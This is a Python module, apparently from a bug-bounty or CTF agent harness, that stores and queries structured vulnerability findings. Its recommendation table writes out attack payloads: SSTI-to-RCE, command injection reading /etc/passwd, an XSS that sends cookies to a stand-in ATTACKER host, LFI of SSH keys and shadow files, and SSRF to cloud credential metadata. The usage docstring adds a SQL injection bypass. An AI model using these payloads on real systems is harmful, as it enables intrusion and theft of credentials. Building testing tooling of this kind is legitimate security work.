"""Structured observation schema for the harness.

Replaces unstructured dict[str, Any] findings with a canonical schema
that includes evidence excerpts, confidence scores, and recommended
next tests. This gives the agent a reasoning scaffold.

Usage:
    from bugbounty_ctf.observations import Observation, ObservationStore

    obs = Observation(
        endpoint="/login",
        method="POST",
        param="username",
        payload="' OR 1=1--",
        status_code=302,
        response_length=1200,
        indicators=["auth_bypass"],
        evidence="Redirect to /dashboard after OR injection",
        confidence=0.8,
        next_test="Try extracting data via UNION SELECT",
    )
    store = ObservationStore()
    store.add(obs)
    query = store.query(endpoint="/login", min_confidence=0.5)
"""

from __future__ import annotations

from dataclasses import dataclass, field
from datetime import datetime
from typing import Any


@dataclass
class Observation:
    """A single structured observation from a test."""

    endpoint: str
    method: str = "GET"
    param: str = ""
    payload: str = ""
    status_code: int = 0
    response_length: int = 0
    response_time: float = 0.0
    indicators: list[str] = field(default_factory=list)
    evidence: str = ""
    confidence: float = 0.0
    next_test: str = ""
    vuln_type: str = ""
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())
    raw_excerpt: str = ""

    def to_dict(self) -> dict[str, Any]:
        return {
            "endpoint": self.endpoint,
            "method": self.method,
            "param": self.param,
            "payload": self.payload,
            "status_code": self.status_code,
            "response_length": self.response_length,
            "response_time": self.response_time,
            "indicators": self.indicators,
            "evidence": self.evidence,
            "confidence": self.confidence,
            "next_test": self.next_test,
            "vuln_type": self.vuln_type,
            "timestamp": self.timestamp,
            "raw_excerpt": self.raw_excerpt[:200],
        }

    @classmethod
    def from_dict(cls, d: dict[str, Any]) -> Observation:
        """Rebuild an Observation from its dict form (for DB hydration)."""
        return cls(
            endpoint=d.get("endpoint", ""),
            method=d.get("method", "GET"),
            param=d.get("param", ""),
            payload=d.get("payload", ""),
            status_code=int(d.get("status_code", 0)),
            response_length=int(d.get("response_length", 0)),
            response_time=float(d.get("response_time", 0.0)),
            indicators=list(d.get("indicators", [])),
            evidence=d.get("evidence", ""),
            confidence=float(d.get("confidence", 0.0)),
            next_test=d.get("next_test", ""),
            vuln_type=d.get("vuln_type", ""),
            timestamp=d.get("timestamp", "") or datetime.now().isoformat(),
            raw_excerpt=d.get("raw_excerpt", ""),
        )

    def is_confirmed(self) -> bool:
        return self.confidence >= 0.7

    def is_interesting(self) -> bool:
        return self.confidence >= 0.3


NEXT_TEST_RECOMMENDATIONS: dict[str, str] = {
    "sqli": "Try UNION SELECT to extract data, or use SLEEP() for time-based blind",
    "ssti": "Escalate to RCE: {{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}",
    "cmdi": "Try: ; cat /etc/passwd; whoami; find / -name flag*",
    "xss": "Set up callback listener and inject: <img src=x onerror='fetch(\"http://ATTACKER:8888/\"+document.cookie)'>",
    "lfi": "Try reading: /etc/shadow, /root/.ssh/id_rsa, /proc/self/environ",
    "ssrf": "Access AWS metadata: http://2852039166/latest/meta-data/iam/security-credentials/",
    "idor": "Enumerate sequential IDs and check for data belonging to other users",
    "nosqli": 'Try: {"$where": "this.password == \'admin\'"} for boolean blind',
    "auth_bypass": "Try accessing authenticated endpoints with the bypassed session",
    "flag_found": "Flag extracted — save it and report",
    "aws_credentials": "Use credentials to enumerate S3, SQS, SSM, Secrets Manager",
}


def recommend_next_test(vuln_type: str, confidence: float) -> str:
    """Generate a next-test recommendation based on vuln type and confidence."""
    if confidence < 0.3:
        return "Run more discriminating tests to increase confidence"
    if confidence < 0.7:
        return f"Partial evidence for {vuln_type} — run confirmation test"
    return NEXT_TEST_RECOMMENDATIONS.get(vuln_type, "Investigate further")


class ObservationStore:
    """Queryable store of observations.

    Replaces the flat list[dict] approach with a queryable store
    that supports filtering by endpoint, vuln type, confidence, etc.
    """

    def __init__(self, db: Any = None, target_host: str = "") -> None:
        self.observations: list[Observation] = []
        # Optional durable backing (a ScannerDB). When set, observations are
        # persisted on add() and can be rehydrated with load_from_db() so the
        # agent's reasoning survives process restarts.
        self.db = db
        self.target_host = target_host

    def add(self, obs: Observation) -> None:
        self.observations.append(obs)
        if self.db is not None:
            self.db.save_observation(self.target_host, obs.to_dict())

    def load_from_db(self, *, min_confidence: float = 0.0) -> int:
        """Hydrate observations from the backing DB. Returns the count loaded."""
        if self.db is None:
            return 0
        rows = self.db.query_observations(self.target_host, min_confidence=min_confidence)
        loaded = [Observation.from_dict(r) for r in rows]
        self.observations = loaded
        return len(loaded)

    def add_finding(
        self,
        endpoint: str,
        vuln_type: str,
        payload: str = "",
        indicators: list[str] | None = None,
        evidence: str = "",
        confidence: float = 0.0,
        status_code: int = 0,
        response_length: int = 0,
    ) -> Observation:
        """Add an observation and return it."""
        obs = Observation(
            endpoint=endpoint,
            payload=payload,
            indicators=indicators or [],
            evidence=evidence,
            confidence=confidence,
            vuln_type=vuln_type,
            status_code=status_code,
            response_length=response_length,
            next_test=recommend_next_test(vuln_type, confidence),
        )
        self.add(obs)
        return obs

    def query(
        self,
        *,
        endpoint: str | None = None,
        vuln_type: str | None = None,
        min_confidence: float = 0.0,
        confirmed_only: bool = False,
    ) -> list[Observation]:
        """Query observations with filters."""
        results = self.observations

        if endpoint:
            results = [o for o in results if endpoint in o.endpoint]
        if vuln_type:
            results = [o for o in results if o.vuln_type == vuln_type]
        if min_confidence > 0:
            results = [o for o in results if o.confidence >= min_confidence]
        if confirmed_only:
            results = [o for o in results if o.is_confirmed()]

        return results

    def confirmed(self) -> list[Observation]:
        """Return only confirmed observations."""
        return [o for o in self.observations if o.is_confirmed()]

    def by_vuln_type(self) -> dict[str, list[Observation]]:
        """Group observations by vulnerability type."""
        groups: dict[str, list[Observation]] = {}
        for obs in self.observations:
            vt = obs.vuln_type or "unknown"
            groups.setdefault(vt, []).append(obs)
        return groups

    def summary(self) -> dict[str, Any]:
        """Return a summary of all observations."""
        confirmed = self.confirmed()
        by_vt = self.by_vuln_type()
        return {
            "total": len(self.observations),
            "confirmed": len(confirmed),
            "by_vuln_type": {vt: len(obs_list) for vt, obs_list in by_vt.items()},
            "confirmed_types": list({o.vuln_type for o in confirmed}),
            "endpoints_tested": list({o.endpoint for o in self.observations}),
        }

    def to_json(self) -> str:
        """Serialize all observations to JSON."""
        import json

        return json.dumps(
            [o.to_dict() for o in self.observations],
            indent=2,
            default=str,
        )

    def from_findings(self, findings: list[dict[str, Any]]) -> None:
        """Import from the old-style findings list (scanner.findings)."""
        for f in findings:
            vuln_type = f.get("type", "").replace("potential_vulnerability", "unknown")
            indicators = f.get("indicators", [])
            confidence = 0.8 if indicators else 0.0
            self.add_finding(
                endpoint=f.get("endpoint", ""),
                vuln_type=vuln_type,
                payload=f.get("payload", ""),
                indicators=indicators,
                evidence="; ".join(f.get("details", [])),
                confidence=confidence,
            )
